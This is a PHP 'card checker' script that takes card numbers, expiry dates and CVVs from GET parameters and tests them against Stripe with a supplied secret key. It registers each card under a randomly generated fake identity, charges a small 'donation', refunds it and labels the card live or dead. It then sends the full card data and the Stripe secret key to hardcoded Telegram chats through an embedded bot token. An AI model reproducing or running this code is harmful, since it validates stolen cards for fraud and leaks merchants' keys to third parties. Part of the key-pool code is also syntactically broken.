<?php


/*===[PHP Setup]==============================================*/

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

error_reporting(1);
$cook = "cookie";
/* Variables */
extract($_GET);

$i = explode("|", $card);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 12);
$last4 = substr($cc, 12, 16);

$first = ucfirst(str_shuffle('abcdefghijklmnopqrstuvwxyz'));
$last = ucfirst(str_shuffle('abcdefghijklmnopqrstuvwxyz'));
$com = ucfirst(str_shuffle('9876543210'));
$emails = str_shuffle("abcdefghijklmnopqrstuvwxyz123456789.");
$email = substr($emails,6)."%40dahyun.ga";

# FORWARDER #

# bot token
$botToken = "8155763109:AAGXN85wvNzmivSikOipePNaAezFENTmLXM";
$website = "https://api.telegram.org/bot".$botToken;

$core = file_get_contents('php://input');
$json = json_decode($core, TRUE);
$chatId = $json["message"]["chat"]["id"];
$message_id = $json["message"]["message_id"];

# Replace Chat Id For CC
$chatId = '7125341830';
# Replace Chat Id For SK
$chatIds = '7125341830';

function sendMessage ($chatId, $message) {     
$url = $GLOBALS['website']."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
}

/*======[Identity Setup]=========*/

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
$cards = json_decode($get, 1);
$name_first = $cards['results'][0]['name']['first'];
$name_last = $cards['results'][0]['name']['last'];
$name_full = ''.$name_first.' '.$name_last.'';

$location_street = $cards['results'][0]['location']['street'];
$location_city = $cards['results'][0]['location']['city'];
$location_state = $cards['results'][0]['location']['state'];
$location_postcode = $cards['results'][0]['location']['postcode'];
if ($location_state == "Alabama") {
    $location_state = "AL";
} else if ($location_state == "alaska") {
    $location_state = "AK";
} else if ($location_state == "arizona") {
    $location_state = "AR";
} else if ($location_state == "california") {
    $location_state = "CA";
} else if ($location_state == "colorado") {
    $location_state = "CO";
} else if ($location_state == "connecticut") {
    $location_state = "CT";
} else if ($location_state == "delaware") {
    $location_state = "DE";
} else if ($location_state == "district of columbia") {
    $location_state = "DC";
} else if ($location_state == "florida") {
    $location_state = "FL";
} else if ($location_state == "georgia") {
    $location_state = "GA";
} else if ($location_state == "hawaii") {
    $location_state = "HI";
} else if ($location_state == "idaho") {
    $location_state = "ID";
} else if ($location_state == "illinois") {
    $location_state = "IL";
} else if ($location_state == "indiana") {
    $location_state = "IN";
} else if ($location_state == "iowa") {
    $location_state = "IA";
} else if ($location_state == "kansas") {
    $location_state = "KS";
} else if ($location_state == "kentucky") {
    $location_state = "KY";
} else if ($location_state == "louisiana") {
    $location_state = "LA";
} else if ($location_state == "maine") {
    $location_state = "ME";
} else if ($location_state == "maryland") {
    $location_state = "MD";
} else if ($location_state == "massachusetts") {
    $location_state = "MA";
} else if ($location_state == "michigan") {
    $location_state = "MI";
} else if ($location_state == "minnesota") {
    $location_state = "MN";
} else if ($location_state == "mississippi") {
    $location_state = "MS";
} else if ($location_state == "missouri") {
    $location_state = "MO";
} else if ($location_state == "montana") {
    $location_state = "MT";
} else if ($location_state == "nebraska") {
    $location_state = "NE";
} else if ($location_state == "nevada") {
    $location_state = "NV";
} else if ($location_state == "new hampshire") {
    $location_state = "NH";
} else if ($location_state == "new jersey") {
    $location_state = "NJ";
} else if ($location_state == "new mexico") {
    $location_state = "NM";
} else if ($location_state == "new york") {
    $location_state = "LA";
} else if ($location_state == "north carolina") {
    $location_state = "NC";
} else if ($location_state == "north dakota") {
    $location_state = "ND";
} else if ($location_state == "Ohio") {
    $location_state = "OH";
} else if ($location_state == "oklahoma") {
    $location_state = "OK";
} else if ($location_state == "oregon") {
    $location_state = "OR";
} else if ($location_state == "pennsylvania") {
    $location_state = "PA";
} else if ($location_state == "rhode Island") {
    $location_state = "RI";
} else if ($location_state == "south carolina") {
    $location_state = "SC";
} else if ($location_state == "south dakota") {
    $location_state = "SD";
} else if ($location_state == "tennessee") {
    $location_state = "TN";
} else if ($location_state == "texas") {
    $location_state = "TX";
} else if ($location_state == "utah") {
    $location_state = "UT";
} else if ($location_state == "vermont") {
    $location_state = "VT";
} else if ($location_state == "virginia") {
    $location_state = "VA";
} else if ($location_state == "washington") {
    $location_state = "WA";
} else if ($location_state == "west virginia") {
    $location_state = "WV";
} else if ($location_state == "wisconsin") {
    $location_state = "WI";
} else if ($location_state == "wyoming") {
    $location_state = "WY";
} else {
    $location_state = "KY";
}

/*===[cURL Processes]=============*/

$show = 'iff';

if(!$sk){
    #$sk = "";
$sks = array(
""
    $sk = $sks[array_rand($sks)];    
}

if(!$amount){
    $amount='1';
}
if(!$currency){
    $currency='usd';
}
if ($currency == "inr") {
  $cur = "₹";
}elseif($currency=="eur"){
  $cur ="€";
}elseif($currency=="cny"){
  $cur ="¥";
}elseif($currency=="php"){
    $cur ="₱";
}elseif($currency=="afn"){
    $cur ="؋";
}elseif(($currency=="usd")||($currency=="cad")||($currency=="mxn")){
  $cur = "$";
}
  #########################[BIN LOOK-UP]############################

  $ch = curl_init();
  $bin = substr($cc, 0, 6);
  curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $bindata = curl_exec($ch);
  $binna = json_decode($bindata, true);
  $brand = $binna['scheme'];
  $country = $binna['country']['name'];
  $type = $binna['type'];
  $bank = $binna['bank']['name'];
  curl_close($ch);

  $bindata1 = " $type - $brand - $bank - $country"; 

/*=======(sources)=======*/
  $x = 0;  
  while(true)  
  {  
$ch = curl_init();
#curl_setopt_array($ch, [CURLOPT_PROXY => $proxy, CURLOPT_PROXYUSERPWD => $pw[array_rand($pw)]]);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name_full.'&owner[email]='.$email.'&owner[address][line1]='.$location_street.'&owner[address][city]='.$location_city.'&owner[address][state]='.$location_state.'&owner[address][postal_code]='.$location_postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy);
$headers = array();
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Authorization: Bearer '.$sk.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result1 = curl_exec($ch);
curl_close($ch);
$cvcc = trim(strip_tags(getStr($result1, '"cvc_check": "','"')));
  if (strpos($result1, "rate_limit"))
  {  
    $x++;  
    continue;  
  }  
  break;  
  }  

/* 1st cURL Results */
$res1 = json_decode($result1, 1);
$src = $res1['id'];
$code = $res1['error']['code'];

$bincountry = $res1['card']['country'];
$binbrand = $res1['card']['brand'];
$binfunding = $res1['card']['funding'];

if(!$src) {
  $msg = "$code [1]";
  $dcode = "card_declined";
  goto eut;
}

if (isset($src)) {

/*=======(customers)=======*/
  $x = 0;  
  while(true)  
  {  
 $ch = curl_init();
#curl_setopt_array($ch, [CURLOPT_PROXY => $proxy, CURLOPT_PROXYUSERPWD => $pw[array_rand($pw)]]);
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Dubu&email='.$email.'&source='.$src.'');
    $headers = array();
    $headers[] = 'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Authorization: Bearer '.$sk.'';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result2 = curl_exec($ch);
    curl_close($ch);
  if (strpos($result2, "rate_limit"))
  {  
    $x++;  
    continue;  
  }  
  break;  
  }  
    /* 2nd cURL Results */
    $res2 = json_decode($result2, 1);
    $cus = $res2['id'];
    $code1 = $res2['error']['code'];

}

if(!$cus) {
  $msg = "$code1 [2]";
  $dcode = "card_declined";
  $result3 = 'NONE';
  goto eut;
}

if (isset($cus)) {
/*========(charges)========*/
  $x = 0;  
  while(true)  
  {  
$ch = curl_init();
#curl_setopt_array($ch, [CURLOPT_PROXY => $proxy, CURLOPT_PROXYUSERPWD => $pw[array_rand($pw)]]);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'00&currency='.$currency.'&description=𝙅𝙚𝙩𝙞𝙭 Donation&customer='.$cus.'');
$headers = array();
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Authorization: Bearer '.$sk.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result3 = curl_exec($ch);
$receipt = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
curl_close($ch);
  if (strpos($result3, "rate_limit"))
  {  
    $x++;  
    continue;  
  }  
  break;  
  }  

/* 2nd cURL Results */
$res3 = json_decode($result3, 1);
$cha = $res3['id'];
#$dcode = $res3['decline_code'];
#$code = $res3['code'];
$dcode1 = getStr($result3, '"decline_code": "','"');
$code2 = getStr($result3, '"code": "','"');
if(!$code2){
    $code2= getStr($result3, '"message": "','"');
}
}

if(!$cha) {
  $msg = "$code2 [3]";
  $dcode = "$dcode1";
  $result4 = 'NONE';
  goto eut;
}

if (isset($cha)) {
/*========(refund)=======*/
  $x = 0;  
  while(true)  
  {  
$ch = curl_init();
#curl_setopt_array($ch, [CURLOPT_PROXY => $proxy, CURLOPT_PROXYUSERPWD => $pw[array_rand($pw)]]);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$cha.'&amount='.$amount.'00&reason=requested_by_customer');
$headers = array();
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Authorization: Bearer '.$sk.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result4 = curl_exec($ch);
$res4 = json_decode($result4, 1);
curl_close($ch);
  if (strpos($result4, "rate_limit"))
  {  
    $x++;  
    continue;  
  }  
  break;  
  }  

/* 2nd cURL Results */

$succ = trim(strip_tags(getStr($result4, '"status": "','"')));
}

//if (strpos($result1, 'rate_limit')) {include 'res2.php';}
//else $msg = 'rate_limit';
/*===(echo)====*/
eut:

if($show=='on'){
echo '1st curl<br>'.$result1;
echo '<br>2nd curl</br>'.$result2;
echo '<br>3rd curl</br>'.$result3;
echo '<br>4th curl</br>'.$result4;
echo '<br>Error:</br>'.$msg;
}

//CVV respo
if (strpos($result4, 'succeeded')) {
echo '#CHARGE CCN Charged! [amount: '.$cur.''.$amount.'.00] [refund: '.$succ.'] [receipt: <a href="'.$receipt.'">receipt_url</a>]';

$chatId = "@chargedbydarkphoenix";
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Charged: Refunded! %0AAmount➔ $cur$amount %0ABinData➔ $bindata1 %0AReceipt➔ <a href='$receipt'>receipt_url</a>";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result3, 'succeeded')) {
echo '#CHARGE CCN Charged! [amount: '.$cur.''.$amount.'.00] [refund: '.$succ.'] [receipt: <a href="'.$receipt.'">receipt_url</a>]';

$chatId = "@chargedbydarkphoenix";
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Charged: Refunded! %0AAmount➔ $cur$amount %0ABinData➔ $bindata1 %0AReceipt➔ <a href='$receipt'>receipt_url</a>";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result4, 'insufficient_funds')) {
echo '#CVV CCN Charged! [charge: succeeded '.$cur.''.$amount.'.00] [refund: fail]';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Charged! %0AAmount➔ $cur$amount %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result3, 'insufficient_funds')) {
echo '#CVV cvc_check: pass [charge: fail insufficient]';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Charge Failed: Insufficient Funds %0AAmount➔ $cur$amount %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result3, '"cvc_check": "pass"')) {    
echo '#CVV cvc_check: pass • '.$dcode.' ';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Charge Failed: $dcode %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result2, '"cvc_check": "pass"')) {    
echo '#CVV cvc_check: pass • '.$dcode.' ';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Charge Failed: $dcode %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result1, '"cvc_check": "pass"')) {    
echo '#CVV cvc_check: pass • '.$dcode.' ';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Charge Failed: $dcode %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result2, 'insufficient_funds')) {    
echo '#CVV insufficient_funds';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Charge Failed: Insufficient Funds %0AAmount➔ $cur$amount %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result1, 'insufficient_funds')) {    
echo '#CVV insufficient_funds';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Charge Failed: Insufficient Funds %0AAmount➔ $cur$amount %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}

//result3
elseif (strpos($result3, 'incorrect_cvc')) {
echo '#CCN incorrect_cvc';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Not Charged %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
}
elseif (strpos($result4, 'success')) {     
echo '#CVV cvc_check: pass [charged: '.$cur.''.$amount.'00] [refund: '.$succ.'] ['.$receipt.']';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Charged: Refunded %0AAmount➔ $cur$amount %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result3, 'success')) {    
echo '#CVV cvc_check: pass [charged: '.$cur.''.$amount.'00] [refund: '.$succ.'] ['.$receipt.']';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Charged: Refunded %0AAmount➔ $cur$amount %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result3, 'lost_card')) {
echo '#DEAD lost card';
}
elseif (strpos($result3, 'pickup_card')) {
echo '#DEAD pickup_card';
}
elseif (strpos($result3, 'stolen_card')) {
echo '#DEAD stolen_card';
}
elseif (strpos($result3, 'incorrect_number')) {
    echo '#DEAD incorrect_number';
}
elseif (strpos($result3, 'do_not_honor')) {
  echo '#DEAD do_not_honor';
}
elseif (strpos($result3, 'card_not_supported')) {
  echo '#DEAD card_not_supported';
}
elseif (strpos($result3, 'transaction_not_allowed')) {
  echo '#DEAD [transaction_not_allowed]';
}

//result1
elseif (strpos($result1, 'expired_card')) {
  echo '#DEAD expired_card';
}
elseif (strpos($result1, 'incorrect_cvc')) {
echo '#CCN incorrect_cvc';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Not Charged %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result1, 'lost_card')) {
echo '#DEAD lost card';
}
elseif (strpos($result1, 'pickup_card')) {
echo '#DEAD pickup_card';
}
elseif (strpos($result1, 'stolen_card')) {
echo '#DEAD stolen_card';

}

//result2
elseif (strpos($result2, 'Your card has expired')) {
  echo '#DEAD expired_card';
}
elseif (strpos($result2, 'incorrect_cvc')) {
echo '#CCN incorrect_cvc';
$send = "Auth➔ CCN %0ACC➔ <code>$card</code> %0AResponse➔ Not Charged %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result2, 'lost_card')) {
echo '#DEAD lost card';
}elseif (strpos($result2, 'pickup_card')) {
echo '#DEAD pickup_card';
}
elseif (strpos($result2, 'stolen_card')) {
echo '#DEAD stolen_card';
}



//decline
elseif (strpos($result1, 'generic_decline')) {
  echo '#DEAD generic_decline';
}
elseif (strpos($result2, 'incorrect_number')) {
  echo '#DEAD incorrect_number';
}
elseif (strpos($result2, 'do_not_honor')) {
  echo '#DEAD do_not_honor';
}
elseif (strpos($result2, 'card_not_supported')) {
  echo '#DEAD card_not_supported';
}
elseif (strpos($result2, 'transaction_not_allowed')) {
  echo '#DEAD transaction_not_allowed';
}
elseif (strpos($result2, '"cvc_check": "fail"')) {
  echo '#DEAD cvc_check fail • '.$dcode.'';
}
elseif (strpos($result2, 'generic_decline')) {
  echo '#DEAD generic_decline';
}
elseif (strpos($result3, 'generic_decline')) {
  echo '#DEAD [generic_decline]';
}
elseif (strpos($result1, 'incorrect_number')) {
  echo '#DEAD incorrect_number';
}
elseif (strpos($result1, 'do_not_honor')) {
  echo '#DEAD do_not_honor';
}
elseif (strpos($result1, 'card_not_supported')) {
  echo '#DEAD card_not_supported';
}
elseif (strpos($result1, 'transaction_not_allowed')) {
  echo '#DEAD [transaction_not_allowed]';
}
elseif (strpos($result3, 'card_decline_rate_limit_exceeded')) {
  echo '#DEAD card_decline_rate_limit_exceeded';
}



//sk error
elseif (strpos($result1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
  echo '#DEAD integration is off';
}

elseif (strpos($result1, 'You did not provide an API key')) {
  echo '#DEAD You did not provide an SK.';
}

elseif (strpos($result1, 'Invalid API Key provided')) {
  echo '#DEAD invalid_api_key';
}

elseif (strpos($result1, 'testmode_charges_only')) {
  echo '#DEAD testmode_charges_only';
}
else {
  echo '#DEAD '.$dcode.' • '.$msg.'';
}

  echo ' BYPASSING: '.$x.' <br>';
?>